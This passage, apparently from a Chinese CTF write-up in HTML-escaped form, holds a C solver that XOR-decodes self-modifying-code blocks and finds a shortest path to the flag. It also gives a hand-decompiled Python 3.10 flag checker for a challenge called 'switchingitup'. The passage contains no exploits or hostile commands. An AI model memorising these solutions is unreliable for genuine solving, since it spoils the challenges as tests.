&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_smc_code[cur].bytecode[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x49&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x83&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\xC1&amp;#39;&lt;/span&gt;)
            cur_smc_code[cur].len[direction] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
        &lt;span style=&#34;color:#75715e&#34;&gt;// read next key to SMC
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_smc_code[cur].bytecode[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x48&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x8D&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x5F&amp;#39;&lt;/span&gt;)
            index_xor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_smc_code[cur].bytecode[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x48&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x8D&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x9F&amp;#39;&lt;/span&gt;){
            index_xor &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;;
            index_xor &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;;
            index_xor &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
            index_xor &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; (cur_smc_code[cur].bytecode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;;
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; next_smc[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x30&lt;/span&gt;];
    memset(next_smc, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(next_smc));
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        next_smc[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;)(cur_smc_code[cur].bytecode[i] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; smc_xor_code[index_xor &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i]);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; next_depth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cur_smc_code[cur].depth &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (next_depth &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; (next_depth) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (cur_smc_code[i].depth &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (my_strncmp(next_smc, cur_smc_code[i].bytecode, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)){
            FLAG_exist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; i;
        }
    }
    FLAG_exist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;; j&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;){
        cur_smc_code[i].bytecode[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next_smc[j];
    }
    cur_smc_code[i].depth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next_depth;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (next_depth &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;801&lt;/span&gt;){
        FLAG_exist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; i;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;set_up_map&lt;/span&gt;(){
    queue &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; Q;
    Q.push(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;Q.empty()){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; tmp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Q.front();
        Q.pop();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; left &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; analysis_next(tmp, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        G[tmp].push_back(Edge(left, cur_smc_code[tmp].len[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (FLAG_exist) Q.push(left);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; right &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; analysis_next(tmp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
        G[tmp].push_back(Edge(right, cur_smc_code[tmp].len[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (FLAG_exist) Q.push(right);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Path[MAXN], flag[MAXN];
&lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; vis[MAXN];

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Spfa&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Start)
{
    dist[Start] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    queue&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Edge&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; Q;
    Q.push(Edge(Start, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));

    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt;( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;Q.empty() ) {
        Edge P &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Q.front();
        Q.pop();
        vis[P.to] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; true;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; G[P.to].size();
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;len; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            Edge Pn &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; G[P.to][i];
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(dist[Pn.to] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; dist[P.to] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; Pn.len) {
                dist[Pn.to] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dist[P.to] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; Pn.len;
                Path[Pn.to] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; P.to;
                flag[Pn.to] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Pn.path;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;vis[Pn.to] ) {
                    Q.push(Pn);
                    vis[Pn.to] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; true;
                }
            }
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PutPath&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; Star,&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; End)
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(Star &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; End)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ;
    PutPath(Star, Path[End]);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;, flag[End]);
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Init&lt;/span&gt;()
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; MAXN; i&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        G[i].clear();
        dist[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; INF;
        vis[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; false;
        Path[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i;
    }
    FILE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;smc_code.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;r&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC73E0&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i){
        smc_xor_code[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fgetc(fp);
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    Init();
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
    memcpy(cur_smc_code[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].bytecode, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x90\x74\x0D\x48\x8D\x5F\x40\x90\x49\x83\xC1\x49\xEB\xC5\x90\x90\x48\x8D\x5F\x20\x90\x90\x90\x49\x83\xC1\x11\x90\x90\x90\xEB\xB3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x21&lt;/span&gt;);
    cur_smc_code[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;].depth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    set_up_map();
    Spfa(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, dist[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;800&lt;/span&gt;]);
    PutPath(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;800&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;del&gt;好久没有用c写这些东西了，一开始全是bug（&lt;/del&gt;&lt;/p&gt;
&lt;h3 id=&#34;switchingitup&#34;&gt;switchingitup&lt;/h3&gt;
&lt;p&gt;题目描述就说了是 python 3.10.0，一开始还以为没啥区别，结果发现pycdas只支持到了3.9，3.10连反汇编都出不来，好在pycdc的pull requests里有人提交了一份3.10的（现在已经更新了）&lt;del&gt;差点考虑自己魔改pycdc了&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;3.10加了一些新东西，一开始不知道看得很痛苦，后来查到之后感觉就不难了&lt;/p&gt;
&lt;p&gt;上一下目前手动反编译的结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; dis

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;test_func&lt;/span&gt;():
    &lt;span style=&#34;color:#a6e22e&#34;&gt;@__import__&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dataclasses&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dataclass
    &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a1&lt;/span&gt;:
        x: int
        y: str

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;key&lt;/span&gt;(v1):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; v1:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1337&lt;/span&gt;
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gene&lt;/span&gt;(a):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; e &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a:
            &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; e
    
    a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1()
    a3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes(key(iter((&lt;span style=&#34;color:#ae81ff&#34;&gt;1385&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1403&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1402&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1389&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1407&lt;/span&gt;))))
    a6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __import__(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hashlib&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;md5
    I &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; input(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag? &amp;#34;&lt;/span&gt;)
    a4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x: a6(x)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()
    a5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(I)
    a2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {}
    a7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; a5:
        match a5:
            case [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;R, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;]:
                a7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                a2 &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;112&lt;/span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; a7 &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; len(R) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {}
                a5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(gene(enumerate(R)))
            case a1(x, y):
                a7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                a2 &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; {x:y} &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; a7 &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; a4(a3 &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; x)[x] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; y &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {}
            case _:
                a2 &lt;span style=&#34;color:#f92672&#34;&gt;|=&lt;/span&gt; {&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;}
                &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
